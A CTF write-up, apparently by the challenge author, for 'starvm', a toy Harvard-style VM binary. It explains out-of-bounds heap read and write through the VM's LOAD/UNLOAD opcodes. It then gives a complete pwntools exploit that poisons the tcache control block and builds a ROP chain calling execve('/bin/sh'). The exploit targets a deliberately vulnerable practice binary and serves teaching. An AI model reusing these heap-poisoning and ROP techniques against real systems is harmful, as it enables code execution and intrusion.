# starvm

solved by 19 teams

## original idea

After learning the **Harvard architecture**, I want to design some kind of virtual machine which can seperate data and command. So this virtual machine first receives users' command and data, seperating them into different storages, and start executing the machine.

The machine has following operations

```c++
typedef enum {
    VM_MOV,     VM_CMP,     VM_ADD,     VM_SUB,     
    VM_JMP,     VM_XOR,     VM_LOAD,    VM_UNLOAD,
    VM_AND,     VM_OR,      VM_MOVINT,
    VM_PUSH,
    VM_POP,     VM_CALL,    VM_RET,     VM_NOP,     VM_END
} vm_opcode_t;
```

The data structure of the machine is below 

```c++
typedef struct{
    vector<instr*> codestack;
    vector<unsigned int> datastack;
    vector<instr*>::iterator ip;
    // reg[14]: memreg
    // reg[15]: eflags reg
    int reg[14]; 
    unsigned int* mem;
    unsigned int eflags;

} starvm;

```

## vulnerbility

In `init_data`, users can write an arbitary interger into data buffer

```c++
bool init_data(starvm* vmp){
    puts("your cost:");
    int tmp = 0;
    for(int i = 0; i<1000; i++){
        scanf("%d",&tmp);
        if(tmp == -559038737){
            return true;
        }
        else{
            vmp->datastack.push_back(tmp);
        }
    }
    return false;

}
```

Then in `VM_LOAD` and `VM_UNLOAD`, users can make out of bound read and write in memory

```c++
case VM_LOAD:
    // load reg, bias
    op1 = vmp->datastack[data_cnt++];
    meml = vmp->datastack[data_cnt++];
    if(op1>14){
        bad();
    }
    if(vmp->mem == NULL){
        vmp->mem = (unsigned int*)malloc(0x70);
    }
    // oob read
    vmp->reg[op1] = vmp->mem[meml];
    vmp->ip++;
    continue;
case VM_UNLOAD:
    // unload reg, bias
    op1 = vmp->datastack[data_cnt++];
    meml = vmp->datastack[data_cnt++];
    if(op1>14){
        bad();
    }
    if(vmp->mem == NULL){
        vmp->mem = (unsigned int*)malloc(0x70);
    }
    // oob w
    vmp->mem[meml] = vmp->reg[op1];
    vmp->ip++;
    continue;
```

Since mem is in heap area, users can overwrite entry in `tcache control block`to forge an block targeting at the return address of `main` or `execute`, and do ROP. We have provided the following gadgets to decrease the difficulty.

```c++
void dummy(){
    __asm__("xor %rdx, %rdx; ret");
    __asm__("pop %rax; ret");
    __asm__("syscall");
}

```

And the stack address is also provided at the beginning of the program.

```c++
int main(){
    starvm* vmp = init_vm();
    printf("your vm starts at %llx\n", &vmp);
    ...
```

## exploit

```python
from pwn import *
io = process("./starvm")
context.log_level='debug'
context.terminal = ['tmux','split','-hp','60']



VM_MOV=0
VM_CMP=1
VM_ADD=2
VM_SUB=3
VM_JMP=4
VM_XOR=5
VM_LOAD=6
VM_UNLOAD=7
VM_AND=8
VM_OR=9
VM_MOVINT=10
VM_PUSH=11
VM_POP=12
VM_CALL=13
VM_RET=14
VM_NOP=15
VM_END=16



# success at writing into stack

pop_rax_ret = 0x0000000000401468
syscall = 0x000000000040146a
pop_rdi = 0x00000000004017cb
pop_rsi = 0x00000000004016f0
xor_rdx=0x0000000000401464

shaddr_h = 0x6e69622f
shaddr_l = 0x68732f

io.recvuntil("your vm starts at ")
stack_info = int(io.recvuntil("\n",drop=True),16)
success("stack info: "+hex(stack_info))


retaddr = (stack_info-0x10)&0xfffffffffffffff0
retaddr_high = (retaddr&0xffffffff00000000)>>32
retaddr_low = retaddr&0xffffffff
# gdb.attach(io,"b *0x4017be\n")
instr = [
        VM_MOVINT,
         VM_UNLOAD,
         VM_MOVINT,
         VM_UNLOAD,

        VM_LOAD,
         VM_LOAD,
         VM_ADD,

        VM_ADD,

         VM_MOVINT,
         VM_ADD,
         VM_UNLOAD,
         VM_ADD,
         VM_MOVINT,
         VM_MOVINT,
         VM_MOVINT,
         VM_UNLOAD,
         VM_UNLOAD,
         VM_UNLOAD,
         VM_UNLOAD,
         VM_LOAD,

         # write to stack
         # POP RAX
         VM_MOVINT,
         VM_UNLOAD,
         VM_UNLOAD,

         # 0x3b
         VM_MOVINT,
         VM_UNLOAD,
         VM_UNLOAD,

         # POP RDI
         VM_MOVINT,
         VM_UNLOAD,
         VM_UNLOAD,

         # shaddr
         VM_UNLOAD, # reg 9
         VM_UNLOAD,

         # xor rdx, rdx
         VM_MOVINT,
         VM_UNLOAD,
         VM_UNLOAD,

         # pop rsi
         VM_MOVINT,
         VM_UNLOAD,
         VM_UNLOAD,

         # 0
         VM_UNLOAD,
         VM_UNLOAD,

         # syscall
         VM_MOVINT,
         VM_UNLOAD,
         VM_UNLOAD,

        
         VM_END]
vm_mem_bias = -10
stack_addr = 0xaaa # get rop
gad1=0xaaa
gad2=0xaaa
free_chunk_cnt = 0x000000ff
# load reg0, heapaddr
# vmload to save a copy of addr
# rewrite vm->mem to tcache, control the tcache control block
# each chunk: for the first three, add 20, for the forth , add 10

DATA = [
    8,shaddr_l,
        8,1,
        8,shaddr_h,
        8,0,

        0,0, # load
        0,-0xbe0//4, # load
        1,0, # reg[1] = reg[0]

        9,1,

        2,-0x012b00, # mov INT to reg2
        1,2, # reg1 = reg1+reg2
        1,-0xbe0//4, # mem[-0x3a0]=reg[1]
        2,1,
        4,retaddr_high,
        5,retaddr_low,
        6,free_chunk_cnt,
        6, 0x1c//4, # write to tcache control block's block cnt
        5, 0xc0//4,
        4, 0xc4//4, # write stack addr to tcache control block
        7, 0x11f20//4, # write 0 to mem, mem=NULL
        0,0, # NOW SHOULD ALLOC AT STACK

        # write to stack
        # pop rax
        10,pop_rax_ret,
        10,8//4,
        11,12//4,

        10,0x3b,
        10,16//4,
        11,20//4,

        10,pop_rdi,
        10,24//4,
        11,28//4,

        9,32//4,
        11,36//4,

        10,xor_rdx,
        10,40//4,
        11,44//4,

        10,pop_rsi,
        10,48//4,
        11,52//4,

        11,56//4,
        11,60//4,

        10,syscall,
        10,64//4,
        11,68//4,
        

        0xdeadbeef]

payload_instr = ""
payload_data = ""

for con in instr:
    payload_instr+=str(con)
    payload_instr+=" "

for con in DATA:
    payload_data += str(con)
    payload_data +=" "

io.recvuntil("command")
io.sendline(payload_instr)

io.recvuntil("cost")
for i in DATA:
    io.send(str(i)+"\n")



io.interactive()
```

## feedback

Actually this binary in compiled with `partial relro`. So it's also possible to hijack `delete` GOT to get a shell. However, this method may not work well when attacking the remote, it needs some small adjustment. Thanks for `emmm`from `Spirit`.



